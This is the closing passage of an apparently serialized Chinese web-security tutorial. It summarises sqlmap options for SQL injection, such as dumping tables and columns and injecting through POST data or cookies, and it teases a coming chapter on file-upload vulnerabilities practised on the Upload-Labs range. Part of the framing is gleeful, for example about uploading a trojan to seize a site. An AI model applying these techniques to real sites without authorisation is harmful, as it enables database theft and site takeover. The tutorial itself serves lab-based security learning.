   - `-T` 指定表
   - `--columns` 爆字段
   - `--dump` 导出数据
   - `--batch` 自动确认
   - `--level` / `--risk` 测试等级
   - `-r` 从文件加载请求
   - `--data` POST数据
   - `--cookie` Cookie
5. **POST注入** —— 用`--data`或`-r`
6. **Cookie注入** —— 用`--cookie`，记得调`--level 2`
7. **核心理念** —— **先手工，后工具！** 工具只是辅助，原理才是根本

记住：工具是把双刃剑，用好了能帮你效率翻倍，用不好会让你变成"脚本小子"。希望大家都能正确地使用工具，而不是被工具所"使用"。🙏

### 下章预告 📢

SQL注入的内容到这一章就告一段落了。从下一章开始，我们将进入一个全新的漏洞类型——**文件上传漏洞**！

文件上传漏洞可以说是Web安全里最"爽"的漏洞之一了——直接上传个木马，就能拿到网站的控制权，简直不要太刺激！😈

我们要挑战的是大名鼎鼎的 **Upload-Labs**，一个专门练习文件上传的靶场，整整 **21关**！从最简单的前端绕过，到各种后缀名绕过、内容检测绕过、.htaccess绕过、解析漏洞绕过... 各种姿势应有尽有！

准备好了吗？文件上传的战场，等你来战！⚔️

我们下一章见！👋

---

> 💪 **学习格言**：工欲善其事，必先利其器。但器利不等于活好，关键还得看用工具的人！
